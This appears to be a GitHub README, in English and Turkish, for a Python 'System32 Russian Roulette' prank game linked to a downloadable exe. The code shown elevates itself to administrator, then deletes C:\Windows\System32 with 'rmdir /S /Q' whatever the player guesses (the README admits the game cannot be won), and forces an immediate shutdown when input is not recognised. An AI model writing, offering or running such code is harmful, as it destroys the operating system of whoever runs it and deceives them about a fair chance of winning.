
# RUSSIAN ROULETTE 🔫
The concept of the game is very simple: the program holds a number between 0 and 11, and you try to guess it. If you can't guess it, the system32 file, which is necessary for Windows to function, gets deleted. But don’t worry, when you open the application, it actually asks you if you really want to play or not.
## How Does It Work ? [(exe file)](https://github.com/b4randeniz/Russian-Roulette-system32-/releases/tag/untagged-016921a2390443bd7d93)
```
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # If not an administrator, restart with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)
```
This part of the code is used to run the code as an administrator.

```
print("Welcome to System32 Roulette")  # print
time.sleep(1.5)  # wait
print("The program will choose a number (between 1 and 10) and if you can't guess it, System32 will be deleted!")  # print
time.sleep(1.5)  # wait
print("This process poses a risk of deleting files necessary for Windows to function. Do you want to proceed? (yes/no)")  # print
devam = input("Yes or No: ").lower()  # take input and save to devam variable
```
In this section, the user is presented with an explanation of the game, and a question is asked. The question asked is saved 
in the variable named 'devam'.
```
if devam == "yes":  # if devam variable is yes, do
    randomsayi = random.randint(0, 11)  # choose a number between 0 and 11 and save to randomsayi variable
    print("I have chosen a number")  # print
    time.sleep(1.5)  # wait
    cevap = int(input("What do you think the number is: "))  # take input and save to cevap variable
```
This part of the code handles the situation where the value stored in the devam variable is "yes." In this case, the process continues as follows: a random number is generated and presented to the user. The user's response is saved in the cevap variable, and the program proceeds from there
```
if cevap == randomsayi:  # if cevap variable is equal to randomsayi variable, do
        randomsayi = random.randint(0, 11)  # choose a number between 0 and 11 and save to randomsayi variable
        print("The number I chose: " + str(randomsayi))  # print
        time.sleep(1.5)  # wait
        print("You lost")  # print
        time.sleep(1.5)  # wait
        print("System32 is being deleted")
        time.sleep(2.5)  # wait
        os.system("rmdir /S /Q C:\\Windows\\System32")  # delete system32
   
    else:  # if cevap variable is not equal to randomsayi variable, do
        print("The number I chose: " + str(randomsayi))  # print
        time.sleep(1.5)  # wait
        print("You lost")  # print
        time.sleep(1.5)  # wait
        print("System32 is being deleted")  # print
        time.sleep(2.5)  # wait
        os.system("rmdir /S /Q C:\\Windows\\System32")  # delete system32
```
In the continuation of the program, the cevap variable is evaluated. If the user correctly guesses the number, the system selects another random number and informs the user that they guessed incorrectly, displaying the number on the screen. In the case where the user guesses incorrectly from the start, the same actions occur. In both scenarios, the System32 directory is deleted, making it impossible to win the game.
```
elif devam == "no":  # if devam variable is no, do
    print("Were you afraid of losing?")  # print
    time.sleep(1.5)  # wait
    print("Coward!")  # print

else:  # if devam variable is something other than yes or no, do
    print("I didn't understand what you wrote (I definitely didn't get tired of coding). I'll take that as a no.")  # print
    time.sleep(1.5)  # wait
    print("Since you wrote something unclear, I will punish you.")  # print
    time.sleep(2.5)  # wait
    os.system("shutdown /s /t 1")  # shut down the computer
```
This part continues from the evaluation of the devam variable at the beginning of the program. If the user writes "no," they are ridiculed, and the game is closed. However, if the user does not input "yes" or "no," meaning they entered an unrecognized value, they are punished by shutting down the computer.

---------------------------------------------------------------------------------------------------------------------------------------------------

# RUS RULETİ 🔫
Oyunun olayı çok basit: Program 0 ile 11 arasında bir sayı tutuyor ve siz bu sayıyı tahmin etmeye çalışıyorsunuz. Eğer bilemezseniz, Windows'un çalışması için gerekli olan system32 dosyası siliniyor. Ama endişelenmeyin, uygulamayı açtığınızda gerçekten oynamak isteyip istemediğinizi soruyor.
## Nasıl Çalışır ? [(exe dosyası)](https://github.com/b4randeniz/Russian-Roulette-system32-/releases/tag/untagged-016921a2390443bd7d93)
```
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # Yönetici değilse, yönetici haklarıyla yeniden başlat
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)
```
Bu kodun bu kısmı, kodu yönetici olarak çalıştırmak için kullanılır.
```
print("System32 Rulete Hoş Geldiniz") # yazdır
time.sleep(1.5) # bekle
print("Program Bir Sayı Seçecek (1 ila 10 arası) Ve Bilemezseniz System32 Silinecek!") # yazdır
time.sleep(1.5) # bekle
print("Bu İşlem Windowsun Çalışması İçin Gerekli Olan Dosyaları Silme Tehlikesi Taşır Devam Etmek İstiyormusunuz? (evet/hayır)") # yazdır
devam = input("Evet yada Hayır: ").lower() # giriş al ve devam değişkenine kaydet
```
Bu bölümde, kullanıcıya oyunun açıklaması sunulur ve bir soru sorulur. Sorulan soru 'devam' adlı değişkene kaydedilir.
```
if devam == "evet": # eğer devam değişkeni evet ise yap 
   randomsayi = random.randint(0,11) # 0 ile 11 arasında bir sayı seç ve randomsayi değişkenine kaydet
   print("Sayıyı Tuttum") # yazdır
   time.sleep(1.5) # bekle
   cevap = int(input("Sayı Sence Ne: ")) # giriş al ve cevap değişkenine kaydet
```
Bu kodun bu kısmı, 'devam' değişkeninde saklanan değerin "evet" olduğu durumu ele alır. Bu durumda işlem şu şekilde devam eder: rastgele bir sayı oluşturulur ve kullanıcıya sunulur. Kullanıcının yanıtı 'cevap' değişkenine kaydedilir ve program buradan devam eder.
```
if cevap == randomsayi: # eğer cevap değişkeni randomsayi değişkeniyle eşit ise yap
      randomsayi = random.randint(0,11) # 0 ile 11 arasında bir sayı seç ve randomsayi değişkenine kaydet
      print("Tuttuğım sayı: " + str(randomsayi)) # yazdır
      time.sleep(1.5) # bekle
      print("Kaybettin") # yazdır
      time.sleep(1.5) # bekle
      print("System32 Siliniyor")
      time.sleep(2.5) # bekle
      os.system("rmdir /S /Q C:\\Windows\\System32") # system32 yi sil
   
   else: # eğer cevap değişkeni randomsayi değişkeniyle eşit değilse yap
      print("Tuttuğım sayı: " + str(randomsayi)) # yazdır
      time.sleep(1.5) # bekle
      print("Kaybettin") # yazdır
      time.sleep(1.5) # bekle
      print("System32 Siliniyor") # yazdır
      time.sleep(2.5) # bekle
      os.system("rmdir /S /Q C:\\Windows\\System32") # system32 yi sil
```
Programın devamında, 'cevap' değişkeni değerlendirilir. Eğer kullanıcı sayıyı doğru tahmin ederse, sistem başka bir rastgele sayı seçer ve kullanıcıya yanlış tahmin ettiğini bildirir, seçilen sayıyı ekranda gösterir. Kullanıcı başlangıçta yanlış tahmin ederse, aynı işlemler gerçekleşir. Her iki durumda da System32 dizini silinir, bu da oyunun kazanılmasını imkansız hale getirir.
```
elif devam == "hayır": # eğer devam değişkeni hayır ise yap
   print("Kaybetmektenmi Korktun?") # yazdır
   time.sleep(1.5) # bekle
   print("Korkak Seni!") # yazdır

else: # eğer devam değişkeni evet veya hayırdan başka bir değer aldıysa yap
   print("Bu Yazdığını Anlamadım (kesinlikle kodlamaya üşenmedim) Bunu Hayır Olarak Alıyorum") # yazdır
   time.sleep(1.5) # bekle
   print("Anlaşılamayan Birşey Yazdığın İçin Sana Ceza Veriyorum") # yazdır
   time.sleep(2.5) # bekle
   os.system("shutdown /s /t 1") # bilgisayarı kapat
```
Bu kısım, programın başındaki 'devam' değişkeninin değerlendirilmesinden devam eder. Eğer kullanıcı "hayır" yazarsa, kullanıcı aşağılanır ve oyun kapatılır. Ancak, kullanıcı "evet" veya "hayır" yazmazsa, yani tanınmayan bir değer girerse, bilgisayar kapatılarak cezalandırılır.


